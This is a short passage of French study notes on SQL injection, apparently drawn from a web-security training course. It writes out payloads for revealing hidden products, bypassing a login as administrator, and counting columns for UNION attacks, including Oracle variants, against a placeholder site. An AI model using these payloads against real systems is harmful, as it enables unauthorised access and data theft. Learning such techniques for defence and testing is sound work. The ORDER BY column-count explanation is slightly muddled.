# SQL Injection

## Récupération de données cachées

Afficher les articles cachés d'un shop :

```
https://insecure-website.com/products?category=Gifts'--
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

## Détournement de la logique applicative

Contourner le formulaire de login avec le compte admin : 

```
user : administrator'--
password : test
```

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

## Récupérer un ensemble de données d'autres tables

Exemple : 

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

Cette requête SQL renvoie un seul ensemble de résultats avec deux colonnes, contenant les valeurs des colonnes "a" et "b" dans "table1" ;  et des colonnes "c" et "d" dans "table2".

### Les conditions pour que cela fonctionne

- Chaque requête doit renvoyer le même nombre de colonnes.
- Le type renvoyé doit-être une chaîne de caractères.

  ### La chaîne d'exploitation

1) Déterminer le nombre de colonnes renvoyés :

```
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--
etc. -> IF ERROR THEN OK, WE HAVE 3 COLUMNS

'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
etc. -> IF ERROR DISAPPEAR THEN OK, WE HAVE 3 COLUMNS


FOR ORACLE DATABASE :
'+UNION+SELECT+NULL+FROM+DUAL--
'+UNION+SELECT+NULL,NULL+FROM+DUAL--
etc.
```

Cheat Sheet dispo ici pour les BDD spécifiques : https://portswigger.net/web-security/sql-injection/cheat-sheet

  2) Déterminer les types de données et leurs compatibilités

  

